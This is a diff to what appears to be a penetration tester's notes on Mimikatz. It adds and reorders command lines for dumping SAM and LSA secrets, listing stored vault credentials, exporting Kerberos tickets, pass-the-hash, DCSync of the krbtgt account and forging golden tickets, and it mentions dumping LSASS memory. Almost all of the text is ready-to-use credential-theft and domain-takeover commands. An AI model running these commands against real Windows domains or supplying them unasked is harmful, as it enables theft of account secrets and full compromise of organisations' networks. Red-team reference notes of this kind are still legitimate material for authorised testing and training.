@@ -25,8 +25,8 @@ mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./securit
 mimikatz# lsadump::lsa /patch
 mimikatz# vault::list # list credential manager vaults
 mimikatz# vault::cred # list credentials
+mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 ```
-</div><div>
 
 To perform a pass-the-hash attack using a `rc4` or `NTML` hash:
 
@@ -34,6 +34,14 @@ To perform a pass-the-hash attack using a `rc4` or `NTML` hash:
 mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy
 mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy /run:cmd.exe
 mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:xxx.yyy /run:cmd.exe
+```
+</div><div>
+
+To perform a DCSync attack (Admin required)
+
+```shell!
+mimikatz# lsadump::dcsync /user:example\krbtgt
+mimikatz# lsadump::dcsync /user:example\krbtgt /domain:example.com
 ```
 
 We can decrypt secrets encrypted using DPAPI master key using:
@@ -53,8 +61,6 @@ Request a TGS ticket:
 
 ```shell!
 mimikatz# kerberos::ask /target:cn # request TGS for cn
-mimikatz# base64 /out:true
-mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 ```
 
 📚 See also: [pypykatz](pypykatz.md) for Linux users.
@@ -76,20 +82,17 @@ Golden ticket (Admin not required)
 mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
 ```
 
-Got the following errors and no fix worked. I manually dumped the LSASS memory (40MB!) and analyzed it on Linux.
+Got the following errors and no fix worked. I manually dumped the LSASS memory (40MB!) and analyzed it on Linux. Otherwise, use Impacket secrets dump, it works fine.
 
 ```text!
 ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
 ```
-
-
 </div><div>
 
-DCSync (Admin required)
+If not the default:
 
 ```shell!
-mimikatz# lsadump::dcsync /user:example\krbtgt
-mimikatz# lsadump::dcsync /user:example\krbtgt /domain:example.com
+mimikatz# base64 /out:true
 ```
 </div></div>
